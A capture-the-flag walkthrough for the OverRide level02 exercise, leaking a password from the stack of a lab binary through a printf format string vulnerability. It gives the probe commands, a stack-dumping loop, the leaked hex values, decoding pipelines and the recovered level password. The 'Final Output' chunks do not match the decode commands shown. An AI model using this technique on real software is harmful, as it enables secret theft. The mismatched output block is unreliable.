
# 🔐 OverRide – Level02 Walkthrough

## 🧠 Goal

Extract the password for the next level by exploiting a **format string vulnerability**.

---

## 1️⃣ Understanding the Program

```bash
./level02
```

Outputs:

```
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username:
```

After entering any username and password, you get:

```
<your_user> does not have access!
```

---

## 2️⃣ Disassembling the Program

Attempting to analyze the binary using GDB:

```bash
gdb ./level02
```

However, upon `run`, the program fails with:

```
ERROR: failed to open password file
```

> 🔴 **Important**: The binary detects it's running in a debugger and refuses to open the password file.

This made direct memory inspection impossible (e.g., using `x/s $rbp - offset`).

---

## 3️⃣ Static Analysis

Using `disas main` to disassemble the binary revealed:

- It reads the password from a file using `fopen()`.
- The password is read with `fread()` into a stack buffer.
- Later, the user input is compared to this buffer via `strncmp()`.

So the password **is loaded into memory**, but we can’t easily read it with GDB.

---

## 4️⃣ Discovering the Format String Vulnerability

The program uses:

```c
printf(buffer);
```

Instead of:

```c
printf("%s", buffer);
```

Classic **format string vulnerability** — we can read arbitrary memory.

Test:

```bash
echo "%x %x %x %x" | ./level02
```

This outputs raw hex values from the stack. Vulnerability confirmed.

---

## 5️⃣ Brute-force Stack Dumping

We wrote a loop to leak multiple stack positions:

```bash
for ((i = 1; i < 50; i++)); do
    echo "$i - %$i\$p" | ./level02 | grep does
done
```

Example result:

```
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
```

Each hex string looks like an ASCII password chunk in **little-endian**.

---

## 6️⃣ Rebuilding the Password

We decoded each leaked value with the following command:

```bash
echo 756e505234376848 | sed 's/../& /g' | tac -rs ' ' | tr -d '\n ' | xxd -r -p; echo
echo 45414a3561733951 | sed 's/../& /g' | tac -rs ' ' | tr -d '\n ' | xxd -r -p; echo
echo 377a7143574e6758 | sed 's/../& /g' | tac -rs ' ' | tr -d '\n ' | xxd -r -p; echo
echo 354a35686e475873 | sed 's/../& /g' | tac -rs ' ' | tr -d '\n ' | xxd -r -p; echo
echo 48336750664b394d | sed 's/../& /g' | tac -rs ' ' | tr -d '\n ' | xxd -r -p; echo
```

> These commands:
> - Split the hex string into byte pairs
> - Reverse byte order (little endian → big endian)
> - Convert hex to ASCII using `xxd`

---

## 7️⃣ Final Output

You’ll get lines like:

```
uNR4h7GH
EAJ5as9Q
7zqCWNgX
5J5hnGXs
H3gPfK9M
```

Combine all lines to get the full password.

---

## 8️⃣ Login with the Real Password

```bash
./level02
--[ Username: edouard
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Success!

---

## 🧩 Summary Table

| Step | Description |
|------|-------------|
| 1.   | Binary reads password from file into memory |
| 2.   | GDB blocked us — program refuses to open file in debugger |
| 3.   | Disassembled and found `printf(buffer)` vulnerability |
| 4.   | Brute-forced `%i$p` to leak password from stack |
| 5.   | Reversed little-endian hex → ASCII |
| 6.   | Logged in with the real password |


